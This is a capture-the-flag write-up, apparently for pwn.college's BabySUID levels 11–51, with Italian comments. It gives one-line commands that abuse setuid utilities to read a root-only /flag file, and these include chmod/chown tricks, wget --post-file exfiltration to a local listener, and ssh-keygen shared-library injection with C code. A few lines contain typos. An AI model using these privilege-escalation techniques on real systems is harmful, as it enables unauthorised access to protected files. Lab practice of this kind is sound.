# PWN College BabySUID

## lvl 11
```sh
od -A n -a /flag | tr -d ' ,\n' | sed 's/nl/\n/'
```
`-A n` toglie la colonna degli indirizzi di sinistra, `-a` stampa caratteri
`tr -d ' ,\n'` toglie gli spazi e `\n`
`sed 's/nl/\n/'` sostituisce nl con `\n`

## lvl 12
```sh
hd -f /flag
```
## lvl 13
```sh
xxd /flag | xxd -r
```

## lvl 14

~~~sh
base32 /flag | base32 -d
~~~

## lvl 15

~~~sh
base64 /flag | base64 -d
~~~

## lvl 16

~~~sh
split -l 1 /flag
cat <split_output_file>
~~~

## lvl 17

~~~sh
gzip -kcv /flag | gzip -dv
~~~

## lvl 18

~~~sh
bzip2 -cvk /flag | bzip2 -dcv
~~~

## lvl 19

~~~sh
zip flag.zip /flag
cat flag.zip
~~~

## lvl 20 

~~~sh
tar -cvf flag.tar /flag
cat flag.tar
~~~

## lvl 21

~~~sh
ar -r flag.ar /flag
cat flag.ar
~~~

## lvl 22

~~~sh
ls flag | cpio -ov > ~/flag
cat ~/flag
~~~

## lvl 23

~~~sh
genisoimage -sort /flag
~~~

## lvl 24

~~~sh
env cat /flag 
~~~

## lvl 25

~~~sh
find / -name flag -exec grep "pwn.college" {} \;
~~~

## lvl 26

~~~makefile
# create a file called makefile and put inside:
# and just run make

main: /flag
    cat /flag
~~~

## lvl 27

~~~sh
nice cat /flag
~~~

## lvl 28

~~~sh
timeout 5s cat /flag
~~~

## lvl 29

~~~sh
stdbuf -oL cat /flag
~~~

## lvl 30 

~~~sh
setarch --addr-no-randomize cat /flag
~~~

## lvl 31 

~~~sh
watch -x cat /flag
~~~

## lvl 32

~~~sh
socat -u FILE:"/flag" TCP-LISTEN:5778,reuseaddr
socat -u TCP:localhost:5778 STDOUT > ~/flag
cat flag 
~~~

## lvl 33

~~~sh
whiptail --title "Opening file" --textbox /flag 25 80
~~~

## lvl 34

~~~sh
awk "{print}" /flag
~~~

## lvl 35

~~~sh
sed "" /flag
~~~

## lvl 36

~~~sh
ed /flag 
p (to print the text)
~~~

## lvl 37

~~~sh
chown hacker /flag
cat /flag
~~~

## lvl 38

~~~sh
chmod +r /flag
cat /flag
~~~

## lvl 39

~~~sh
cp -i --no-preserve=mode,ownership /flag /home/hacker/flag
~~~

## lvl 40

~~~sh
mv /usr/bin/cat /usr/bin/mv
# challenge file again to set setuid
mv /flag
~~~

## lvl 41
~~~pl
#!/usr/bin/perl
use warnings;
use strict;

my $filename = '/flag';

open(FH, '<', $filename) or die $!;

while(<FH>){
print $_;
}

close(FH);
~~~

```perl
open(FLAG,"/flag");
print <FLAG>;
close FLAG;
```

## lvl 42
~~~py
#!/usr/bin/python
file = open("/flag","r")
print(file.read())
~~~

## lvl 43

~~~rb
#!/usr/bin/ruby
file = File.open("/flag").read
print file
~~~

## lvl 44

~~~sh
#!/usr/bin/bash -p
file="/flag"
printf "%s" "$(<$file)" # oppure cat /flag
~~~

## lvl 45

~~~sh
data -f /flag
~~~

## lvl 46

~~~sh
dmesg -F /flag
~~~

## lvl 47

~~~sh
wc --files0-from /flag
~~~

## lvl 48
~~~sh
gcc @/flag # to give flags via a file
~~~

## lvl 49
~~~sh
as @/flag
~~~

## lvl 50
~~~sh
wget localhost:5000 --post-file=/flag # to send file via POST
nc -l localhost 5000 # listening server
~~~

## lvl 51
    ssh-keygen -D ./lib.so
    # library injection
~~~c
#include <stdio.h>

void __attribute__ ((constructor)) constructor(){
        FILE *f;
        f = fopen("/flag","r");
        char c;
        c = fgetc(f);
        while(c != EOF){
                printf("%c",c);
                c = fgetc(f);
        }

        fclose(f);
}
void C_GetFunctionList(){}
~~~

```c
FILE *f = fopen("/flag","r");
char buffer[80];

fgets(buffer,80,f);
prtinf("%s\n",buffer);
fclose(f);

```

```sh
gcc -shared -o lib.so script.c
ssh-keygen -D ./lib.so
```

~~~makefile
CC=gcc
CFLAGS=-Wall -Werror -fpic -I.
FNAME = lib.so

%.o: %.c
	$(CC) -c -o $@ $< $(CFLAGS)

all: $(FNAME).o
	$(CC) -shared -o $(FNAME).so $(FNAME).o

clean:
	rm -f $(FNAME).o $(FNAME).so
~~~
[Lib2Shell](https://github.com/SeanPesce/lib2shell/tree/master)

[Explanation](https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html)